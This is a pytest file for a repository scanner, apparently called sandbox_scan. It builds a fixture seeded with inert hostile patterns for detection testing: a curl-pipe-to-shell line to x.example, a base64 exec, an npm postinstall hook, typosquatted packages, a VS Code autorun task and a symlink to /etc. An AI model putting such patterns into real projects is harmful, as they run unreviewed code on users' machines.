"""Characterization tests: the booby-trapped fixture must trip the rules, the clean one must not."""

import json
import os
import subprocess
import sys
import tarfile
from importlib import resources
from pathlib import Path

import pytest

from sandbox_scan.pack import pack
from sandbox_scan.report import verdict
from sandbox_scan.textutil import clean

SCANNER = str(resources.files("sandbox_scan").joinpath("remote_scanner.py"))


def scan(root: Path) -> set[str]:
    out = subprocess.run([sys.executable, "-I", SCANNER, str(root)], capture_output=True, text=True, check=True)
    return {f["rule"] for f in json.loads(out.stdout)["findings"]}


def write(root: Path, rel: str, text: str) -> None:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text)


@pytest.fixture
def evil(tmp_path: Path) -> Path:
    write(
        tmp_path, "package.json", json.dumps({"scripts": {"postinstall": "node x.js"}, "dependencies": {"lodas": "1"}})
    )
    write(tmp_path, "requirements.txt", "requestss==1\n")
    write(tmp_path, ".vscode/tasks.json", '{"tasks":[{"runOptions":{"runOn": "folderOpen"}}]}')
    write(tmp_path, "run.sh", "curl http://x.example/a | sh\n")
    write(tmp_path, "a.py", "import base64\nexec(base64.b64decode('eA=='))\n")
    write(tmp_path, ".git/hooks/pre-commit", "#!/bin/sh\n")
    (tmp_path / "link").symlink_to("/etc")
    return tmp_path


def test_evil_repo_trips_rules(evil: Path) -> None:
    assert {
        "npm-lifecycle-script",
        "typosquat?",
        "vscode-autorun-task",
        "pipe-to-shell",
        "b64-exec",
        "git-hook",
        "symlink-escape",
    } <= scan(evil)


def test_binary_hidden_in_node_modules_bin_is_flagged(tmp_path: Path) -> None:
    p = tmp_path / "node_modules/.bin/tool"
    p.parent.mkdir(parents=True)
    p.write_bytes(b"\x7fELF" + b"\x00" * 64)
    assert "binary-executable" in scan(tmp_path)


def test_clean_repo_has_no_findings(tmp_path: Path) -> None:
    write(tmp_path, "main.py", "print('hello')\n")
    write(tmp_path, "package.json", json.dumps({"scripts": {"test": "jest"}, "dependencies": {"lodash": "4"}}))
    assert scan(tmp_path) == set()


@pytest.mark.parametrize(
    ("sevs", "notes", "label", "rc"),
    [
        (["CRITICAL", "HIGH"], [], "DO NOT USE", 2),
        (["HIGH"], [], "SUSPICIOUS - MANUAL REVIEW REQUIRED", 1),
        (["MEDIUM"], ["Semgrep results missing ... INCOMPLETE"], "INCONCLUSIVE - SCAN INCOMPLETE", 1),
        (["MEDIUM"], [], "NO RED FLAGS, BUT REVIEW THE NOTES", 0),
        ([], [], "NO KNOWN RED FLAGS", 0),
    ],
)
def test_verdict(sevs: list[str], notes: list[str], label: str, rc: int) -> None:
    assert verdict([{"severity": s} for s in sevs], notes) == (label, rc)


def test_pack_strips_dangerous_modes(tmp_path: Path) -> None:
    src = tmp_path / "src"
    src.mkdir()
    f = src / "a.sh"
    f.write_text("x")
    os.chmod(f, 0o4777)
    pack(src, tmp_path / "c.tgz", 10)
    with tarfile.open(tmp_path / "c.tgz") as tf:
        assert tf.getmember("a.sh").mode == 0o755


def test_pack_rejects_oversize(tmp_path: Path) -> None:
    (tmp_path / "a.bin").write_bytes(b"0" * 2_000_000)
    with pytest.raises(SystemExit):
        pack(tmp_path, tmp_path.parent / "c.tgz", 1)


def test_clean_strips_escapes_and_bidi() -> None:
    assert clean("a\x1b[31m‮b") == "a?[31m?b"
